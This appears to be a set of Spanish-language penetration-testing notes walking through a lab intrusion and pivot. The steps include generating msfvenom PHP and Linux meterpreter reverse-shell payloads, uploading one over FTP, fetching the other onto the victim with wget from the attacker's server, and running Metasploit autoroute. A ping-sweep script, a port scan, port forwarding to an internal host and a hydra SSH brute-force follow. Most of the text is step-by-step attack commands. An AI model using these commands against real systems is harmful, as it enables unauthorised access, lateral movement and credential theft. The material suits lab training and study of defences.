- Tenemos una maquina con el puerto 21 abierto, por ese puerto vamos a subir un payloads para generara una reverse.
```
msfvenom -p php/reverse_php LHOST=(IP_ATACANTE) LPORT=443 -f raw > pwned.php
```

![](../Imagenes/Pasted%20image%2020250112171153.png)

- Entramos en el ftp y usamos el comando ==put== + el nombre de archivo que creamos para poder subirlo.

![](../Imagenes/Pasted%20image%2020250112171319.png)

- Dejamos en escucha y en la URL del navegador ponemos la IP victima / nombre del archivo para entrar.

![](../Imagenes/Pasted%20image%2020250112171424.png)

- Ya estamos dentro, vamos a hacer otra conexión mas estable.
- Para ingresar en la maquina victima la reverse primero se pone ==bash -c==.
- Casi igual que con Windows, vamos a crear un payload en msfvenom para generar un meterpreter en Linux.
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP_ATACANTE) LPORT=4444 -f elf -b '\x00\x0a\x0d' -o virus
```


![](../Imagenes/Pasted%20image%2020250112172319.png)

- Ahora vamos a compartirlo con la maquina victima levantando un servidor en Python.
```
python3 -m http.server 80
```
- En la sesión ya iniciada que tenemos en la maquina victima usamos el siguiente comando:
```
wget (IP_ATACANTE)/(NOMBRE_FICHERO)
```


![](../Imagenes/Pasted%20image%2020250112172542.png)

- Ahora, vamos a abrir metasploit y crear la sesión de meterpreter.
```
use /multi/handler
```


![](../Imagenes/Pasted%20image%2020250112172732.png)

- Lo configuramos.

![](../Imagenes/Pasted%20image%2020250112172757.png)

- Ingresamos el payload correcto que especificamos en ==msfvenom==, nuestra IP, le damos a run y ejecutamos el archivo virus en la maquina victima.

![](../Imagenes/Pasted%20image%2020250112173002.png)

- Ahora en la maquina victima vamos a darle permiso de ejecución al archivo virus y después ejecutarlo.

![](../Imagenes/Pasted%20image%2020250112173153.png)

- Ya tenemos nuestra sesión meterpreter.

![](../Imagenes/Pasted%20image%2020250112173216.png)

- Si ahora ejecutamos shell y después whoami, vamos a ver que somos usuario ==www-data==, así no se puede hacer Pivoting.

![](../Imagenes/Pasted%20image%2020250112173341.png)

- Tenemos que ser root.
- Para eso tenemos que escalar privilegios en la maquina victima, así que vamos a salir de la sesión interpreter.

![](../Imagenes/Pasted%20image%2020250112173641.png)

- Ahora que somos root.
- Ahora podemos volver al meterpreter.

![](../Imagenes/Pasted%20image%2020250112173831.png)

- Ahora somos root.
- Estando en meterpreter vamos a ejecutar el comando ==ifconfig== , para ver si hay mas maquinas en la red interna.

![](../Imagenes/Pasted%20image%2020250112174107.png)

- Aquí la tenemos.
- Ahora apretamos `ctrl + z` y lo pasamos a segundo plano.

![](../Imagenes/Pasted%20image%2020250112174216.png)

- Si ejecutamos el comando `sessions -l`

![](../Imagenes/Pasted%20image%2020250112174307.png)
- Podemos ver la session interpreter que tiene como ID el 2.
- Ahora ejecutamos el siguiente modulo.
```
use /multi/manage/autoroute
```


![](../Imagenes/Pasted%20image%2020250112174450.png)

- Vamos a configurarlo.

![](../Imagenes/Pasted%20image%2020250112174515.png)

- Aquí solo nos pide SESSION que en este caso seria el numero 2.

![](../Imagenes/Pasted%20image%2020250112174550.png)

- Ejecutamos.

![](../Imagenes/Pasted%20image%2020250112174611.png)

- Ahora el trafico esta enrutado.
- Si ejecutamos el comando `route`, lo vamos a poder ver.

![](../Imagenes/Pasted%20image%2020250112174652.png)

- Están conectadas ambas interfaces de red.
- Ahora hay que conocer las IPS, los HOSTS que están en la red interna.
- Ahora , abrimos otro terminal y usamos este código:
```
nano escaner.sh
```
- Dentro ponemos el siguiente código:
```
#!/bin/bash

for i in {1..255}; do
	timeout 1 bash -c "ping -c 1 10.10.10.$i" >/dev/null
	if [ $? -eq 0 ]; then
		echo "El host 10.10.10.$i está activo"
	fi
done
```
- Este comando ejecuta el comando ==ping== generando una traza ismp a cada uno de los posibles hosts que estén dentro de la red interna.
- Ahora lo compartimos con la maquina victima.
- Para eso en msf usamos el comando:
```
sessions -i (numero de sessions)
```


![](../Imagenes/Pasted%20image%2020250112175758.png)

- Aquí ejecutamos shell.
- ejecutamos el comando:
```
wget (IP_ATACANTE)/(ARCHIVO)
```
- Ya lo tendremos en la maquina victima.

![](../Imagenes/Pasted%20image%2020250112175941.png)

- Ahí mismo le damos permiso de ejecución y lo ejecutamos

![](../Imagenes/Pasted%20image%2020250112180107.png)

- Podemos ver las IP que están activas.
- Vamos a usar la IP 10.10.10.7 que es la IP que sabemos que tenemos de una de las maquinas virtuales que abrimos.
- Volvemos a la sesión de interpreter y luego `ctrl + z`

![](../Imagenes/Pasted%20image%2020250112180345.png)

- Ahora usamos un modulo que es para escanear puertos
```
use scanner/portscan/tcp
```


![](../Imagenes/Pasted%20image%2020250112180456.png)

- Lo configuramos.

![](../Imagenes/Pasted%20image%2020250112180527.png)

- Agregamos el RHOSTS.

![](../Imagenes/Pasted%20image%2020250112180639.png)

- Agregamos la IP de la maquina que queremos escanear.
- Ejecutamos.

![](../Imagenes/Pasted%20image%2020250112180715.png)

- Ya sabemos que puertos tiene abiertos.
- Vamos a atacar los puertos 22 y 631.
- Vamos a traernos los 2 puertos a un puertos especifico.
	- Eso lo tenemos que hacer si o si desde la sesión interpreter.
- Para eso vamos a meternos a la session 2.

![](../Imagenes/Pasted%20image%2020250112180923.png)

- Para hacerlo ahora, ocupamos el siguiente comando:
```
portfwd add -l 222 -p 22 -r 10.10.10.7
```
![[Pasted image 2025011218
![](../Imagenes/Pasted%20image%2020250112181114.png)
- Ahora vamos a hacer un ssh (con los datos que ya conocíamos de esta maquina)
```
ssh (usuario)@(IP_ATACANTE) -p (PUERTO_QUE_ESCOGIMOS)
```
![[Pasted image 20250112181337.png]]
![[Pasted image 20250112181402.png]]
- Ahora vamos a traer el puerto 631
```
portfwd add -l 5000 -p 631 -r 10.10.10.7
```
- Si nos damos cuenta solo cambian los puertos.
![[Pasted image 20250112181527.png]]
- Si pongo en el URL del navegador:
```
127.0.0.1:5000
```
![[Pasted image 20250112181635.png]]
- Estoy dentro.

- Si quiero hacer un ataque con ==hydra== ocuparia el siguiente comando.
```
hydra -l (NOMBRE) -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 222
```
- 222 porque habíamos dejado el puerto 22 en el puerto 222.